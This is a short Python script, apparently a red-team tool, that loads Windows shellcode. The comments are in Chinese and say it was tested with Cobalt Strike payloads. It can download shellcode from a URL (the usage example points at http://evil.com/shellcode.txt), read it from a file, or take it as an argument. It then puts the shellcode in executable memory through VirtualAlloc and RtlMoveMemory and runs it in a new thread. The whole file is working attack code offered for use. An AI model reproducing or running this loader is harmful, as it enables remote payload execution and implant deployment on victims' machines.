import ctypes
import argparse
import codecs
import urllib.request

"""
Usage:
    加载url型，pyloader -u http://evil.com/shellcode.txt
    加载文本型，pyloader -f shellcode.txt
    加载shellcode型，pyloader -s "\xfc\x48\x83\"

测试使用64位Cobalt的shellcode
"""

def loader(code): 
    # 二进制格式
    shellcode = code.encode(encoding="utf-8")

    # 将shellcode转义
    shellcode = codecs.escape_decode(shellcode)[0]
    shellcode = bytearray(shellcode)
    # print(shellcode)
    # 设置VirtualAlloc返回类型为ctypes.c_uint64
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

    # 申请内存
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
 
    # 加载shellcode
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_uint64(ptr), 
        buf, 
        ctypes.c_int(len(shellcode))
    )

    # 创建一个线程从shellcode位置首地址开始执行
    handle = ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0), 
        ctypes.c_int(0), 
        ctypes.c_uint64(ptr), 
        ctypes.c_int(0), 
        ctypes.c_int(0), 
        ctypes.pointer(ctypes.c_int(0))
    )

    # 等待上面创建的线程运行完
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))



if __name__ == '__main__':

    parser = argparse.ArgumentParser(
        usage='pyloader -u http://evil.com/shellcode.txt',
        description="Python Shellcode Loader",
    )

    parser.add_argument("-u", dest="url",
                        help="Specify shellcode url")
    parser.add_argument("-f", dest="file",
                        help="Specify shellcode file")
    parser.add_argument("-s", dest="shellcode",
                        help="Specify shellcode raw")

    args = parser.parse_args()

    if args.url is None and args.file is None and args.shellcode is None:
        parser.print_help()
        exit(1)

    if args.url:
        try:
            r = urllib.request.urlopen(args.url).read()
            shellcode = r.decode('utf-8')
        except Exception as e:
            print(e)

    if args.file:
        with open(args.file, 'r') as f:
            shellcode = f.read().rstrip()
            # msf shellcode
            shellcode = shellcode.replace('"', '').replace('\n', '')

    if args.shellcode:
        shellcode = args.shellcode

    loader(shellcode)
